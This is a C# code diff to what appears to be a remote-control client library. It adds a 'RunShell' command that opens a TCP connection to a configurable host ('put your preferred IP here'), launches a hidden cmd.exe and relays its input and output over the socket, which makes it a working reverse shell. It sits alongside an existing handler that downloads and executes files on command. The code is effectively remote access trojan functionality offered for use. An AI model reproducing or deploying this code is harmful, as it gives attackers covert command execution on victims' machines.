@@ -1,6 +1,7 @@
 ﻿using CommonLibrary;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
@@ -15,6 +16,9 @@ namespace ClientLibrary
         private NetworkStream _netstream;
         private TcpClient _client;
         private CancellationTokenSource _token;
+        private StreamWriter ShellWriter;
+        private Process processCmd;
+        private StringBuilder strInput;
 
         private NetworkStream netStream
         {
@@ -203,7 +207,11 @@ namespace ClientLibrary
                                     TcpClass.DownloadAndExeFile(recivedMessage, FileName);
                                     break;
                                 }
-
+                            case MessageType.RunShell:
+                                {
+                                    RunShell();
+                                    break;
+                                }
                             default:
                                 {
                                     Console.WriteLine("Invalid message type");
@@ -221,6 +229,108 @@ namespace ClientLibrary
             {
                 this.netStream.Close();
                 this.myClient.Close();
+            }
+        }
+
+        public async Task AskforShell()
+        {
+            try
+            {
+                if (this.myClient.Connected)
+                {
+                    byte[] data = new byte[0];
+                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.RunShell, data.Length, data);
+
+                    data = myMessage.serialize();
+
+                    await this.netStream.WriteAsync(data, 0, data.Length);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            finally
+            {
+            }
+        }
+
+        private async Task RunShell()
+        {
+            strInput = new StringBuilder();
+            StreamReader ShellReader;
+            if (this.myClient.Connected)
+            {
+                try
+                {
+                    TcpClient ShellClient = new TcpClient("127.0.0.1", 6666);
+                    //put your preferred IP here
+                    NetworkStream ShellStream = ShellClient.GetStream();
+                    ShellReader = new StreamReader(ShellStream);
+                    ShellWriter = new StreamWriter(ShellStream);
+                }
+                catch (Exception err) { return; } //if no Client don't 
+                                                  //continue 
+                processCmd = new Process();
+                processCmd.StartInfo.FileName = "cmd.exe";
+                processCmd.StartInfo.CreateNoWindow = true;
+                processCmd.StartInfo.UseShellExecute = false;
+                processCmd.StartInfo.RedirectStandardOutput = true;
+                processCmd.StartInfo.RedirectStandardInput = true;
+                processCmd.StartInfo.RedirectStandardError = true;
+                processCmd.OutputDataReceived += new
+                DataReceivedEventHandler(CmdOutputDataHandler);
+                processCmd.Start();
+                processCmd.BeginOutputReadLine();
+
+                while (!this.cToken.IsCancellationRequested)
+                {
+                    try
+                    {
+                        strInput.Append(await ShellReader.ReadLineAsync());
+                        strInput.Append("\n");
+                        if (strInput.ToString().LastIndexOf(
+                            "terminate") >= 0) StopServer();
+                        if (strInput.ToString().LastIndexOf(
+                            "exit") >= 0) throw new ArgumentException();
+                        processCmd.StandardInput.WriteLine(strInput);
+                        strInput.Remove(0, strInput.Length);
+                    }
+                    catch (Exception err)
+                    {
+                        Cleanup();
+                        break;
+                    }
+                }
+            }
+        }
+
+        private void Cleanup()
+        {
+            try { processCmd.Kill(); } catch (Exception err) { };
+            ShellWriter.Close();
+            netStream.Close();
+        }
+
+        private void StopServer()
+        {
+            Cleanup();
+            System.Environment.Exit(System.Environment.ExitCode);
+        }
+
+        private async void CmdOutputDataHandler(object sendingProcess,
+            DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    await ShellWriter.WriteLineAsync(strOutput.ToString());
+                    await ShellWriter.FlushAsync();
+                }
+                catch (Exception err) { }
             }
         }
     }
